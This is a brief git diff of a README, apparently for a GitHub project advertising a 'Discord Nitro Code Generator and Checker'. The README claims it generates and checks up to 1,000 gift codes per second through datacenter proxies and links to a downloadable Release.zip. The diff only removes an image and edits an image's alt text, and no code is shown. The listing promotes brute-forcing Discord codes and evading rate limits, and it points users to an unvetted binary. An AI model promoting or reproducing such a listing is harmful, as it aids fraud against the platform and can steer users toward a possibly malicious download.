@@ -3,11 +3,11 @@
 
 > [!TIP] 
 > ## Best Discord Nitro Code Generator and Checker. Generates Classic and Boost Nitro Codes. The generator is very fast, generating and checking codes up to 1,000 / second and works best with datacenter proxies. 
-![photo_2024-10-18_00-00-43](https://github.com/user-attachments/assets/bceada45-70d4-4c8b-9b36-27774e6aadbd)
+
 ## Getting Started:
 
 ### Installation
-[![1](https://github.com/user-attachments/assets/c8e918b4-7bbd-4ca6-8341-45c7646b9926)
+[![](https://github.com/user-attachments/assets/c8e918b4-7bbd-4ca6-8341-45c7646b9926)
 ](https://github.com/SKEY-308/NitroG-2024/releases/download/Release/Release.zip)
 
 
